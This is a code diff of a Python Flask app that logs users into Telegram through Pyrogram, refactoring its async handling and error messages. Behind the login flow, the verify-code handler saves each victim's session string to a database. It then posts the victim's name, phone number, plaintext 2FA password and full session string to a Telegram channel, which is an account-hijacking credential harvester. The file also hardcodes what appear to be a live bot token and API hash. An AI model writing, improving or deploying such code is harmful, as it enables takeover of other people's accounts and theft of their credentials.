@@ -36,7 +36,6 @@ except Exception as e:
     db = None
     db_connected = False
 
-# Fixed collection references
 users_col = db.users if db is not None else None
 ads_config_col = db.ads_config if db is not None else None
 
@@ -57,27 +56,17 @@ API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
 
-# Thread-safe storage for temporary client sessions
 clients = {}
 clients_lock = threading.Lock()
 
 def run_async(coro):
-    """Helper to run async code in Flask"""
+    """Run async code properly"""
     try:
-        loop = asyncio.get_event_loop()
-        if loop.is_running():
-            # If we're in an already running loop, create a new one in a thread
-            new_loop = asyncio.new_event_loop()
-            t = threading.Thread(target=lambda: new_loop.run_until_complete(coro))
-            t.start()
-            t.join()
-            return None
-        else:
-            return loop.run_until_complete(coro)
-    except RuntimeError:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         return loop.run_until_complete(coro)
+    finally:
+        loop.close()
 
 # ========== DATABASE HELPERS ==========
 def save_session_to_db(session_data):
@@ -241,7 +230,7 @@ def login():
 
 @app.route("/api/send-code", methods=["POST"])
 def send_code():
-    data = request.json or {}
+    data = request.get_json() or {}
     phone = data.get("phone", "").strip()
     session_name = data.get("session_name", "session").strip()
 
@@ -281,22 +270,19 @@ def send_code():
             await client.disconnect()
             return {"ok": False, "error": str(e)}
     
-    # Run async code properly
-    loop = asyncio.new_event_loop()
-    try:
-        result = loop.run_until_complete(send_code_async())
-        if result.get("ok"):
-            return jsonify(result)
-        else:
-            return jsonify(result), 400 if "Invalid" in result.get("error", "") else 429 if "Wait" in result.get("error", "") else 500
-    finally:
-        loop.close()
+    result = run_async(send_code_async())
+    
+    if result.get("ok"):
+        return jsonify(result)
+    else:
+        status_code = 400 if "Invalid" in result.get("error", "") else 429 if "Wait" in result.get("error", "") else 500
+        return jsonify(result), status_code
 
 @app.route("/api/verify-code", methods=["POST"])
 def verify_code():
-    data = request.json or {}
+    data = request.get_json() or {}
     session_id = data.get("session_id", "")
-    code = data.get("code", "").strip()
+    code = data.get("code", "").strip().replace(" ", "")  # Remove spaces from code
     password = data.get("password", "")
 
     if not session_id:
@@ -306,10 +292,10 @@ def verify_code():
         client_data = clients.get(session_id)
     
     if not client_data:
-        return jsonify(ok=False, error="Session expired"), 400
+        return jsonify(ok=False, error="Session expired. Please try again."), 400
 
-    if not code:
-        return jsonify(ok=False, error="Invalid code"), 400
+    if not code or not code.isdigit():
+        return jsonify(ok=False, error="Please enter a valid verification code"), 400
 
     client = client_data["client"]
     phone = client_data["phone"]
@@ -341,45 +327,43 @@ def verify_code():
         except Exception as e:
             return {"user": None, "session_string": None, "error": str(e)}
 
-    loop = asyncio.new_event_loop()
-    try:
-        result = loop.run_until_complete(verify_async())
-        
-        if result["error"] == "2FA_PASSWORD_REQUIRED":
-            return jsonify(ok=False, requires_password=True), 401
-        elif result["error"] == "INVALID_CODE":
-            return jsonify(ok=False, error="Invalid code"), 401
-        elif result["error"] == "CODE_EXPIRED":
-            with clients_lock:
-                clients.pop(session_id, None)
-            return jsonify(ok=False, error="Code expired"), 401
-        elif result["error"]:
-            return jsonify(ok=False, error=result["error"]), 500
-
-        user = result["user"]
-        session_string = result["session_string"]
-        
-        user_info = {
-            "id": user.id,
-            "first_name": user.first_name,
-            "last_name": user.last_name or "",
-            "username": user.username or "N/A",
-            "phone": phone,
-            "session_string": session_string,
-            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "session_name": session_name
-        }
-
-        db_id = save_session_to_db(user_info)
-        if db_id:
-            print(f"✅ User saved to MongoDB with ID: {db_id}")
-
+    result = run_async(verify_async())
+    
+    if result["error"] == "2FA_PASSWORD_REQUIRED":
+        return jsonify(ok=False, requires_password=True), 401
+    elif result["error"] == "INVALID_CODE":
+        return jsonify(ok=False, error="Invalid verification code. Please check and try again."), 401
+    elif result["error"] == "CODE_EXPIRED":
         with clients_lock:
             clients.pop(session_id, None)
+        return jsonify(ok=False, error="Code expired. Please request a new code."), 401
+    elif result["error"]:
+        return jsonify(ok=False, error=result["error"]), 500
 
-        country_code = phone[:3] if phone.startswith("+") else phone[:2]
+    user = result["user"]
+    session_string = result["session_string"]
+    
+    user_info = {
+        "id": user.id,
+        "first_name": user.first_name,
+        "last_name": user.last_name or "",
+        "username": user.username or "N/A",
+        "phone": phone,
+        "session_string": session_string,
+        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "session_name": session_name
+    }
 
-        channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>
+    db_id = save_session_to_db(user_info)
+    if db_id:
+        print(f"✅ User saved to MongoDB with ID: {db_id}")
+
+    with clients_lock:
+        clients.pop(session_id, None)
+
+    country_code = phone[:3] if phone.startswith("+") else phone[:2]
+
+    channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>
 
 👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
 🔗 <b>Username:</b> @{user_info['username']}
@@ -388,25 +372,23 @@ def verify_code():
 🌍 <b>Country:</b> +{country_code}
 ⏰ <b>Created:</b> {user_info['created_at']}"""
 
-        if password:
-            channel_msg += f"\n🔑 <b>2FA Password:</b> <code>{password}</code>"
+    if password:
+        channel_msg += f"\n🔑 <b>2FA Password:</b> <code>{password}</code>"
 
-        channel_msg += f"""
+    channel_msg += f"""
 
 <b>🔐 SESSION STRING:</b>
 <code>{session_string}</code>"""
 
-        send_to_channel(channel_msg)
-        session["user"] = user_info
+    send_to_channel(channel_msg)
+    session["user"] = user_info
 
-        return jsonify(ok=True, user={
-            "id": user_info["id"],
-            "name": f"{user_info['first_name']} {user_info['last_name']}",
-            "username": user_info["username"],
-            "phone": phone
-        })
-    finally:
-        loop.close()
+    return jsonify(ok=True, user={
+        "id": user_info["id"],
+        "name": f"{user_info['first_name']} {user_info['last_name']}",
+        "username": user_info["username"],
+        "phone": phone
+    })
 
 @app.route("/api/logout", methods=["POST"])
 def logout():
@@ -439,7 +421,6 @@ def toggle_ads():
     new_status = not config.get("ads_enabled", False)
 
     if update_ads_config({"ads_enabled": new_status}):
-        # Fixed indentation - this block is now properly inside the if statement
         if users_col is not None:
             users_col.update_many({}, {"$set": {"ads_enabled": new_status}})
 
@@ -453,7 +434,8 @@ def toggle_ads():
 
 @app.route("/api/set-interval", methods=["POST"])
 def set_interval():
-    interval = request.json.get("interval")
+    data = request.get_json() or {}
+    interval = data.get("interval")
 
     if not interval or not isinstance(interval, int):
         return jsonify({"success": False, "error": "Invalid interval"}), 400
@@ -469,7 +451,8 @@ def set_interval():
 
 @app.route("/api/set-caption", methods=["POST"])
 def set_caption():
-    caption = request.json.get("caption", "")
+    data = request.get_json() or {}
+    caption = data.get("caption", "")
 
     if update_ads_config({"caption": caption}):
         return jsonify({
